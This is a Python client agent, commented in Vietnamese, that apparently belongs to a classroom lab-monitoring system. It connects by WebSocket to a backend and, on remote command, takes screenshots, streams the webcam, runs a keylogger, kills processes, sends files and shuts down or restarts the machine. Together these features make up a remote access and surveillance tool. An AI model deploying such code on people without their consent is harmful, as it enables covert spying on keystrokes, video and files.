import json
import time
import threading
import base64
import io
import queue  # Thread-safe queue
import websocket  # Thư viện kết nối WebSocket thuần

# Thư viện phục vụ Webcam
import cv2

# Import các hàm chức năng từ thư mục con modules/
from modules.system import get_process_list, kill_process_by_pid, execute_power_cmd
from modules.media import capture_screen_to_base64
from modules.app_control import manage_application
from modules.sandbox import get_sandbox_files, read_file_content
# Import module cảnh báo màn hình nổi (Tkinter) - bọc try/except đề phòng lỗi
try:
    from modules.screen_notify import show_warning, hide_warning, update_warning_text, destroy as destroy_notify
    SCREEN_NOTIFY_AVAILABLE = True
    print("✅ Screen notify module loaded")
except Exception as e:
    print(f"⚠️ Screen notify không khả dụng: {e}")
    SCREEN_NOTIFY_AVAILABLE = False
    def show_warning(): pass
    def hide_warning(): pass
    def update_warning_text(text): pass
    def destroy_notify(): pass

# Import module keylogger - bọc try/except vì pynput cần môi trường desktop (X server)
try:
    from modules.keylogger import start_keylogger_module, stop_keylogger_module, configure_keylogger
    KEYLOGGER_AVAILABLE = True
except Exception as e:
    print(f"⚠️ Keylogger không khả dụng (thiếu môi trường desktop): {e}")
    KEYLOGGER_AVAILABLE = False
    def configure_keylogger(*args, **kwargs): pass  # no-op fallback

# Kali Linux only - Lay ten may tu hostname
import socket
MACHINE_NAME = socket.gethostname().replace(' ', '_')
print(f"🖥️ Hệ điều hành: Kali Linux")
print(f"🏷️ Tên máy: {MACHINE_NAME}")

webcam_streaming = False

# ============================================
# 🔥 KIẾN TRÚC QUEUE: websocket-client KHÔNG thread-safe
# TẤT CẢ các luồng (on_message, sys_monitor, webcam, keylogger)
# đều phải enqueue message vào đây. Một luồng duy nhất (sender_thread)
# sẽ lấy message ra và gửi qua WebSocket.
# ============================================
send_queue = queue.Queue()
ws_ref = [None]  # Mutable container cho ws_client

def sender_loop():
    """Luồng duy nhất gửi dữ liệu qua WebSocket, tránh tuyệt đối race condition"""
    while True:
        try:
            payload_dict = send_queue.get()  # Block cho đến khi có message
            cmd = payload_dict.get('command', payload_dict.get('event', 'unknown'))
            current_ws = ws_ref[0]
            if current_ws is None:
                print(f"⚠️ [SENDER] ws_ref[0] là None, bỏ qua message: {cmd}")
                continue
            try:
                # WebSocketApp.sock exists when connected, use presence check
                sock_ok = current_ws.sock is not None
                if not sock_ok:
                    print(f"⚠️ [SENDER] Socket not available (ws.sock is None)")
                if sock_ok:
                    payload_json = json.dumps(payload_dict)
                    current_ws.send(payload_json)
                    if cmd in ['agent_send_screen', 'agent_download_ready', 'agent_send_webcam']:
                        print(f"✅ [SENDER] Đã gửi thành công {cmd} ({len(payload_json)} bytes)")
                else:
                    print(f"⚠️ [SENDER] Socket không kết nối (sock={current_ws.sock is not None}), bỏ qua: {cmd}")
            except (BrokenPipeError, ConnectionError, ConnectionResetError, OSError, AttributeError) as e:
                print(f"⚠️ [SENDER] Lỗi gửi WebSocket (broken pipe/connection): {e}")
            except Exception as e:
                print(f"⚠️ [SENDER] Lỗi gửi WebSocket không xác định: {e}")
        except Exception as e:
            print(f"❌ [SENDER] Lỗi sender loop: {e}")
            time.sleep(0.1)

def enqueue_send(payload_dict):
    """Thay thế safe_send: chỉ enqueue, không gửi trực tiếp"""
    try:
        queue_size = send_queue.qsize()
        if queue_size > 50:
            print(f"⚠️ [QUEUE] Hàng đợi lớn: {queue_size} messages đang chờ gửi")
        send_queue.put_nowait(payload_dict)
        return True
    except Exception as e:
        print(f"⚠️ Lỗi enqueue message: {e}")
        return False


def webcam_stream_worker(ws):
    """Luồng phụ chạy độc lập chịu trách nhiệm đọc camera bằng OpenCV và nén ảnh gửi về"""
    global webcam_streaming
    print("🎥 [WEBCAM] Khởi chạy Worker ghi hình...")
    print(f"📷 [WEBCAM] Đang mở camera index 0...")
    # Thử mở camera với nhiều backend khác nhau
    cap = None
    
    # Cách 1: Thử V4L2 với định dạng MJPEG để đảm bảo màu sắc chính xác
    print("📷 [WEBCAM] Thử V4L2 + MJPEG...")
    cap = cv2.VideoCapture(0, cv2.CAP_V4L2)
    if cap.isOpened():
        print(f"  ✓ V4L2 đã mở")
        # Ép định dạng MJPEG để tránh lỗi màu xanh do YUYV raw
        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
        print(f"  ✓ Đã set FOURCC=MJPG")
    
    # Cách 2: Thử V4L2 mặc định nếu cách 1 thất bại
    if not cap or not cap.isOpened():
        print("📷 [WEBCAM] Thử V4L2 mặc định...")
        if cap:
            cap.release()
        cap = cv2.VideoCapture(0, cv2.CAP_V4L2)
        if cap.isOpened():
            print(f"  ✓ V4L2 mặc định đã mở")
            cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
            print(f"  ✓ Đã set FOURCC=MJPG")
    
    # Cách 3: Thử backend mặc định (không chỉ định backend)
    if not cap or not cap.isOpened():
        print("📷 [WEBCAM] Thử backend mặc định...")
        if cap:
            cap.release()
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            print(f"  ✓ Backend mặc định đã mở")
            cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
            print(f"  ✓ Đã set FOURCC=MJPG")
    
    # Kiểm tra cuối cùng
    if not cap or not cap.isOpened():
        print("❌ [WEBCAM] Không thể mở thiết bị ghi hình (Webcam)")
        print("💡 Hãy kiểm tra:")
        print("   - Camera có được kết nối không?")
        print("   - Thiết bị /dev/video0 có tồn tại không?")
        print("   - Quyền truy cập camera (sudo usermod -aG video $USER)")
        webcam_streaming = False
        return
    
    # Đọc frame thử để xác nhận camera hoạt động thực sự
    print("📷 [WEBCAM] Đang kiểm tra camera (đọc thử frame)...")
    time.sleep(1.0)
    ret, test_frame = cap.read()
    if not ret or test_frame is None:
        print("❌ [WEBCAM] Camera mở được nhưng không đọc được frame")
        print("   Camera có thể bị chiếm bởi process khác hoặc không hoạt động")
        cap.release()
        webcam_streaming = False
        return
    
    print(f"📷 [WEBCAM] Camera hoạt động! Frame shape: {test_frame.shape}")
    print(f"📷 [WEBCAM] Width={cap.get(cv2.CAP_PROP_FRAME_WIDTH)}, Height={cap.get(cv2.CAP_PROP_FRAME_HEIGHT)}, FPS={cap.get(cv2.CAP_PROP_FPS)}")
    
    # Giảm FPS và chất lượng JPEG để tránh corrupt trên VM
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
    cap.set(cv2.CAP_PROP_FPS, 8)
    time.sleep(0.5)

    fail_count = 0
    while webcam_streaming:
        try:
            ret, frame = cap.read()
            if not ret:
                fail_count += 1
                print(f"⚠️ [WEBCAM] Không đọc được frame (lần {fail_count})")
                if fail_count >= 10:
                    print("❌ [WEBCAM] Quá nhiều lần lỗi, dừng luồng")
                    break
                time.sleep(0.2)
                continue

            print(f"📷 [WEBCAM] Đọc frame {fail_count} lần, kích thước: {frame.shape}")
            fail_count = 0
            frame_resized = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
            if buffer is None or len(buffer) == 0:
                print("⚠️ [WEBCAM] JPEG encode thất bại")
                continue
            img_base64 = base64.b64encode(buffer).decode('utf-8')
            payload = {
                "command": "agent_send_webcam",
                "machine_name": MACHINE_NAME,
                "image_base64": img_base64
            }
            result = enqueue_send(payload)
            if result:
                print(f"📤 [WEBCAM] Đã gửi frame ({len(img_base64)} chars base64)")
        except Exception as e:
            print(f"❌ Lỗi truyền gói tin camera: {e}")
            time.sleep(0.5)
        time.sleep(0.35)

    cap.release()
    print("🎥 [WEBCAM] Worker đã kết thúc")


def on_message(ws, message):
    """Lắng nghe lệnh điều khiển trực tiếp từ FastAPI Backend dội xuống"""
    global webcam_streaming
    
    try:
        data = json.loads(message)
        command = data.get('command')
        data_args = data.get('data', {})

        # 🎯 LUỒNG CHỤP MÀN HÌNH (SCREENSHOT & LIVE STREAM)
        if command == 'take_screenshot':
            print(f"📸 [SCREENSHOT] Nhận lệnh chụp màn hình từ Backend!")
            # Hiển thị cảnh báo nổi góc phải màn hình sinh viên
            show_warning()
            base64_image = capture_screen_to_base64()
            if base64_image:
                print(f"📸 [SCREENSHOT] Chụp thành công! Kích thước ảnh base64: {len(base64_image)} bytes")
                enqueue_send({
                    "command": "agent_send_screen",
                    "machine_name": MACHINE_NAME,
                    "image_base64": base64_image,
                    "is_static": True
                })
                print(f"📸 [SCREENSHOT] Đã enqueue ảnh vào hàng đợi gửi đi.")
            else:
                print(f"❌ [SCREENSHOT] Chụp màn hình thất bại (capture_screen_to_base64 trả về None)")
            return

        # 🎯 LUỒNG QUẢN LÝ TIẾN TRÌNH (TASK MANAGER)
        elif command == 'kill_process':
            pid = data_args.get('pid') if isinstance(data_args, dict) else None
            if pid:
                pid = int(pid)
                if kill_process_by_pid(pid):
                    enqueue_send({
                        "command": "agent_send_procs",
                        "machine_name": MACHINE_NAME,
                        "processes": get_process_list()
                    })
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN BẬT/TẮT ỨNG DỤNG WHITELIST
        elif command == 'manage_app':
            action = data_args.get('action')
            app_name = data_args.get('app_name')
            manage_application(action, app_name)
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN THIẾT BI GHI HÌNH WEBCAM
        elif command == 'get_webcam_frame':
            print(f"🎥 [WEBCAM] Nhận lệnh bật webcam, webcam_streaming={webcam_streaming}")
            if not webcam_streaming:
                webcam_streaming = True
                threading.Thread(target=webcam_stream_worker, args=(ws,), daemon=True).start()
                print("✓ [WEBCAM] Đã khởi động luồng webcam")
            else:
                print("ℹ️ [WEBCAM] Luồng webcam đã chạy")
            return

        elif command == 'stop_webcam_stream':
            webcam_streaming = False
            return

        # 🎯 LUỒNG TRUY XUẤT DANH SÁCH TỆP TIN (FILE SANDBOX)
        elif command == 'list_directory':
            files = get_sandbox_files()
            enqueue_send({
                "command": "agent_send_files",
                "machine_name": MACHINE_NAME,
                "files": files
            })
            return

        # 🎯 LUỒNG TRÍCH XUẤT NỘI DUNG FILE ĐỂ TẢI VỀ WEB
        elif command == 'read_file_content':
            file_title = data_args.get('file_name')
            file_payload = read_file_content(file_title)
            if file_payload:
                enqueue_send({
                    "command": "agent_download_ready",
                    "machine_name": MACHINE_NAME,
                    "file_name": file_payload["file_name"],
                    "file_base64": file_payload["file_base64"]
                })
            return

        # 🎯 LUỒNG KIỂM SOÁT PHÍM BẤM THỰC HÀNH (KEYLOGGER DEMO CHUẨN ĐẠO ĐỨC)
        elif command == 'toggle_keylogger':
            if not KEYLOGGER_AVAILABLE:
                print("⚠️ Keylogger không khả dụng (thiếu môi trường desktop)")
                enqueue_send({"command": "error", "message": "Keylogger không khả dụng trên máy này"})
                return
            capturing = data_args.get('capturing', True)
            if capturing:
                start_keylogger_module(ws, MACHINE_NAME)
            else:
                stop_keylogger_module()
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN NGUỒN HỆ THỐNG
        elif command in ['shutdown', 'restart']:
            execute_power_cmd(command.upper())

    except json.JSONDecodeError as e:
        print(f"❌ Lỗi phân tích JSON: {e}")
    except Exception as e:
        print(f"❌ Lỗi xử lý bản tin: {e}")


def on_open(ws):
    print(f"✅ [CONNECTED] Đã thông nòng kết nối WebSocket tới FastAPI! Tên máy: {MACHINE_NAME}")
    enqueue_send({"event": "agent_register", "machine_name": MACHINE_NAME})


def on_close(ws, close_status_code, close_msg):
    global webcam_streaming
    print("❌ [DISCONNECTED] Mất kết nối tới Server Backend. Hủy toàn bộ luồng phụ.")
    webcam_streaming = False
    if KEYLOGGER_AVAILABLE:
        stop_keylogger_module()
    # Ẩn cảnh báo màn hình khi mất kết nối
    hide_warning()
    destroy_notify()


if __name__ == '__main__':
    BACKEND_WS_URL = f"ws://192.168.1.2:8000/ws/agent/{MACHINE_NAME}"

    def create_ws_client():
        """Tạo WebSocketApp mới và cập nhật ws_ref để các luồng khác dùng đúng instance"""
        client = websocket.WebSocketApp(
            BACKEND_WS_URL,
            on_open=on_open,
            on_message=on_message,
            on_close=on_close
        )
        ws_ref[0] = client
        return client

    ws_client = create_ws_client()

    # ============================================
    # 🔥 Khởi chạy SENDER LOOP - luồng duy nhất ghi WebSocket
    # ============================================
    threading.Thread(target=sender_loop, name="ws-sender", daemon=True).start()

    # Truyền tham chiếu enqueue_send và ws_ref cho keylogger module để thread-safe
    if KEYLOGGER_AVAILABLE:
        configure_keylogger(enqueue_send, ws_ref)

    # Luồng chạy ngầm độc lập gửi thông số Task Manager định kỳ (5 giây / lần)
    def sys_monitor_loop():
        while True:
            try:
                current_ws = ws_ref[0]
                if current_ws and current_ws.sock:
                    enqueue_send({
                        "command": "agent_send_procs",
                        "machine_name": MACHINE_NAME,
                        "processes": get_process_list()
                    })
            except Exception:
                pass
            time.sleep(5)

    threading.Thread(target=sys_monitor_loop, name="sys-monitor", daemon=True).start()

    # Vòng lặp kết nối có tự động reconnect khi mất kết nối
    RECONNECT_DELAY = 5
    while True:
        try:
            ws_client.run_forever()
        except Exception as e:
            print(f"⚠️ WebSocket run_forever lỗi: {e}")
        print(f"🔄 Mất kết nối. Thử kết nối lại sau {RECONNECT_DELAY} giây...")
        time.sleep(RECONNECT_DELAY)
        # Tạo lại ws_client vì instance cũ đã đóng
        ws_client = create_ws_client()
        print(f"🔄 Đang kết nối lại tới {BACKEND_WS_URL}...")